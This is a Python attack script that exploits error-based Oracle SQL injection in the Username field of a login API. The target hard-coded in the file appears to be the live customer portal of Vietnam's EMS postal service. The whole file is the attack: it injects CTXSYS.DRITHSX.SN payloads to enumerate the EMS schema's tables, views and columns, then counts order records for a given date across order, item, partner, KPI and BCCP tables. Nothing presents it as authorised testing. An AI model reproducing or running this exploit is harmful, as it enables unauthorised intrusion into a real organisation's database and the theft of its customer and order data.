#!/usr/bin/env python3
"""
全面挖掘所有可能包含当天订单的数据源
"""

import requests
import json
import time

class ComprehensiveOrderMiner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
        self.total_found = {}
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def scan_all_ems_tables(self):
        """扫描EMS schema下所有表的10月10日数据"""
        print("=" * 80)
        print("🔍 第1步：扫描EMS所有表的当天数据")
        print("=" * 80)
        
        date = '20251010'
        date_fields = ['NGAY', 'CREATE_DATE', 'ORDER_DATE', 'SHIP_DATE', 
                       'DATE_LOG', 'CREATED_DATE', 'INSERT_DATE', 'DELIVERY_DATE',
                       'PICKUP_DATE', 'SEND_DATE', 'RECEIVE_DATE']
        
        # 获取所有表名
        print("\n🔎 扫描前100个表...")
        tables_with_data = []
        
        for i in range(1, 101):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' ORDER BY TABLE_NAME) WHERE RN={i}"
            table_name = self.extract_via_error(query)
            
            if table_name:
                # 尝试查找当天数据
                for date_field in date_fields:
                    query_data = f"SELECT COUNT(*) FROM EMS.{table_name} WHERE {date_field}='{date}'"
                    count = self.extract_via_error(query_data)
                    
                    if count and count.isdigit() and int(count) > 0:
                        print(f"   ✅ {table_name:40} ({date_field}): {count:>8} 条")
                        tables_with_data.append({
                            'table': table_name,
                            'date_field': date_field,
                            'count': int(count)
                        })
                        self.total_found[table_name] = int(count)
                        break
                    time.sleep(0.3)
            
            if i % 10 == 0:
                print(f"   ... 已扫描 {i} 个表")
        
        return tables_with_data
    
    def check_dbload_tables(self):
        """检查DBLOADBCCP系列表（可能是批量导入的订单）"""
        print("\n" + "=" * 80)
        print("📦 第2步：检查DBLOADBCCP系列表")
        print("=" * 80)
        
        date = '20251010'
        
        # 查找所有DBLOADBCCP表
        print("\n🔎 查找DBLOADBCCP相关表:")
        for i in range(1, 30):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE 'DBLOADBCCP%') WHERE RN={i}"
            table = self.extract_via_error(query)
            
            if table:
                # 检查是否有当天数据
                query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE ROWNUM<=10000"
                count = self.extract_via_error(query_count)
                
                if count and count.isdigit() and int(count) > 0:
                    print(f"   {i:2}. {table:45} : {count:>10} 条")
                    
                    # 尝试找日期字段
                    date_fields = ['NGAY', 'DATE_LOG', 'CREATE_DATE', 'INSERT_DATE']
                    for df in date_fields:
                        query_today = f"SELECT COUNT(*) FROM EMS.{table} WHERE {df}='{date}'"
                        today_count = self.extract_via_error(query_today)
                        if today_count and today_count.isdigit() and int(today_count) > 0:
                            print(f"       ✅ 10月10日数据: {today_count} 条 ({df})")
                            self.total_found[table] = int(today_count)
                            break
                        time.sleep(0.3)
                
                time.sleep(0.5)
    
    def check_all_views(self):
        """检查所有视图"""
        print("\n" + "=" * 80)
        print("👁️  第3步：检查所有视图的当天数据")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n🔎 查找所有EMS视图:")
        for i in range(1, 30):
            query = f"SELECT VIEW_NAME FROM (SELECT VIEW_NAME, ROWNUM AS RN FROM ALL_VIEWS WHERE OWNER='EMS') WHERE RN={i}"
            view = self.extract_via_error(query)
            
            if view:
                # 检查视图是否有当天数据
                date_fields = ['NGAY', 'CREATE_DATE', 'DATE_LOG']
                for df in date_fields:
                    query_count = f"SELECT COUNT(*) FROM EMS.{view} WHERE {df}='{date}'"
                    count = self.extract_via_error(query_count)
                    
                    if count and count.isdigit() and int(count) > 0:
                        print(f"   ✅ {view:40} ({df}): {count:>8} 条")
                        self.total_found[f"{view}(VIEW)"] = int(count)
                        break
                    time.sleep(0.3)
                
                time.sleep(0.5)
    
    def check_sales_order_table(self):
        """深入检查SALES_ORDER表"""
        print("\n" + "=" * 80)
        print("💰 第4步：深入检查SALES_ORDER表")
        print("=" * 80)
        
        date = '20251010'
        
        # 查看表结构
        print("\n🔎 SALES_ORDER表字段:")
        for i in range(1, 25):
            query = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='SALES_ORDER' AND OWNER='EMS' ORDER BY COLUMN_ID) WHERE RN={i}"
            col = self.extract_via_error(query)
            if col:
                print(f"   {i:2}. {col}")
            time.sleep(0.5)
        
        # 检查数据
        print("\n🔎 SALES_ORDER数据检查:")
        queries = [
            ("总记录数", "SELECT COUNT(*) FROM EMS.SALES_ORDER"),
            ("最新日期", "SELECT MAX(CREATE_DATE) FROM EMS.SALES_ORDER"),
            ("10月份数据", "SELECT COUNT(*) FROM EMS.SALES_ORDER WHERE CREATE_DATE LIKE '202510%'"),
        ]
        
        for name, query in queries:
            result = self.extract_via_error(query)
            if result:
                print(f"   {name}: {result}")
            time.sleep(1)
    
    def check_order_history_table(self):
        """检查ORDER_HISTORY表"""
        print("\n" + "=" * 80)
        print("📜 第5步：检查ORDER_HISTORY表")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总记录数", "SELECT COUNT(*) FROM EMS.ORDER_HISTORY WHERE ROWNUM<=100000"),
            ("10月10日数据", f"SELECT COUNT(*) FROM EMS.ORDER_HISTORY WHERE CREATE_DATE='{date}'"),
            ("10月份数据", "SELECT COUNT(*) FROM EMS.ORDER_HISTORY WHERE CREATE_DATE LIKE '202510%'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
                if name == "10月10日数据" and result.isdigit() and int(result) > 0:
                    self.total_found['ORDER_HISTORY'] = int(result)
            time.sleep(1.5)
    
    def check_postmart_tables(self):
        """检查POSTMART系列表（可能是邮政超市订单）"""
        print("\n" + "=" * 80)
        print("🛒 第6步：检查POSTMART系列表")
        print("=" * 80)
        
        date = '20251010'
        
        tables = ['POSTMART_ITEM', 'POSTMART_STATUS', 'POSTMART_ORDER']
        
        for table in tables:
            print(f"\n🔎 {table}:")
            
            queries = [
                ("总记录数", f"SELECT COUNT(*) FROM EMS.{table} WHERE ROWNUM<=10000"),
                ("10月10日", f"SELECT COUNT(*) FROM EMS.{table} WHERE CREATE_DATE='{date}'"),
            ]
            
            for name, query in queries:
                result = self.extract_via_error(query)
                if result and result.isdigit() and int(result) > 0:
                    print(f"   {name}: {result}")
                    if name == "10月10日":
                        self.total_found[table] = int(result)
                time.sleep(1)
    
    def check_partner_tables(self):
        """检查合作伙伴表"""
        print("\n" + "=" * 80)
        print("🤝 第7步：检查合作伙伴订单表")
        print("=" * 80)
        
        date = '20251010'
        
        # 查找所有PARTNER相关表
        for i in range(1, 20):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE 'PARTNER%') WHERE RN={i}"
            table = self.extract_via_error(query)
            
            if table:
                query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE ROWNUM<=10000"
                count = self.extract_via_error(query_count)
                
                if count and count.isdigit() and int(count) > 0:
                    print(f"   {i:2}. {table:45} : {count:>8} 条")
                    
                    # 检查当天数据
                    query_today = f"SELECT COUNT(*) FROM EMS.{table} WHERE CREATE_DATE='{date}'"
                    today = self.extract_via_error(query_today)
                    if today and today.isdigit() and int(today) > 0:
                        print(f"       ✅ 10月10日: {today} 条")
                        self.total_found[table] = int(today)
                    time.sleep(0.5)
                
                time.sleep(0.5)
    
    def check_kpi_tables(self):
        """检查KPI统计表（可能汇总了订单数据）"""
        print("\n" + "=" * 80)
        print("📊 第8步：检查KPI统计表")
        print("=" * 80)
        
        date = '20251010'
        
        # KPI表可能有汇总数据
        for i in range(1, 20):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE 'KPI%') WHERE RN={i}"
            table = self.extract_via_error(query)
            
            if table:
                # 检查是否有当天数据
                date_fields = ['NGAY', 'DATE_LOG', 'REPORT_DATE']
                for df in date_fields:
                    query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE {df}='{date}'"
                    count = self.extract_via_error(query_count)
                    
                    if count and count.isdigit() and int(count) > 0:
                        print(f"   ✅ {table:40} : {count:>6} 条")
                        self.total_found[table] = int(count)
                        break
                    time.sleep(0.3)
                
                time.sleep(0.5)
    
    def check_item_tables(self):
        """检查ITEM系列表（邮件项目表）"""
        print("\n" + "=" * 80)
        print("📮 第9步：检查ITEM系列表")
        print("=" * 80)
        
        date = '20251010'
        
        for i in range(1, 30):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE '%ITEM%') WHERE RN={i}"
            table = self.extract_via_error(query)
            
            if table:
                query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE NGAY='{date}'"
                count = self.extract_via_error(query_count)
                
                if count and count.isdigit() and int(count) > 0:
                    print(f"   ✅ {table:40} : {count:>8} 条")
                    self.total_found[table] = int(count)
                    time.sleep(0.5)
                
                time.sleep(0.3)
    
    def check_bccp_tables(self):
        """检查BCCP系列表"""
        print("\n" + "=" * 80)
        print("🔄 第10步：检查BCCP系列表")
        print("=" * 80)
        
        date = '20251010'
        
        for i in range(1, 30):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE 'BCCP%') WHERE RN={i}"
            table = self.extract_via_error(query)
            
            if table:
                query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE NGAY='{date}'"
                count = self.extract_via_error(query_count)
                
                if count and count.isdigit() and int(count) > 0:
                    print(f"   ✅ {table:40} : {count:>8} 条")
                    self.total_found[table] = int(count)
                    time.sleep(0.5)
                
                time.sleep(0.3)
    
    def summarize_findings(self):
        """汇总所有发现"""
        print("\n" + "=" * 80)
        print("📊 汇总：所有找到的10月10日数据")
        print("=" * 80)
        
        if self.total_found:
            print(f"\n找到 {len(self.total_found)} 个表/视图包含当天数据：\n")
            
            # 按数量排序
            sorted_tables = sorted(self.total_found.items(), key=lambda x: x[1], reverse=True)
            
            total_records = 0
            for table, count in sorted_tables:
                print(f"   {table:45} : {count:>10,} 条")
                total_records += count
            
            print(f"\n{'='*80}")
            print(f"   总记录数: {total_records:,} 条")
            print(f"{'='*80}")
            
            # 尝试估算真实订单数
            print("\n💡 估算真实订单数:")
            print("   注意：很多表可能记录同一订单的不同状态")
            print("   需要进一步去重分析")
        else:
            print("\n❌ 未找到额外的订单数据")
    
    def run_comprehensive_mining(self):
        """执行全面挖掘"""
        print("=" * 80)
        print("⛏️  全面订单数据挖掘工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行所有挖掘步骤
        self.scan_all_ems_tables()
        self.check_dbload_tables()
        self.check_all_views()
        self.check_sales_order_table()
        self.check_order_history_table()
        self.check_postmart_tables()
        self.check_partner_tables()
        self.check_kpi_tables()
        self.check_item_tables()
        self.check_bccp_tables()
        
        # 汇总
        self.summarize_findings()
        
        print("\n" + "=" * 80)
        print("🎉 全面挖掘完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    miner = ComprehensiveOrderMiner(target_url)
    miner.run_comprehensive_mining()
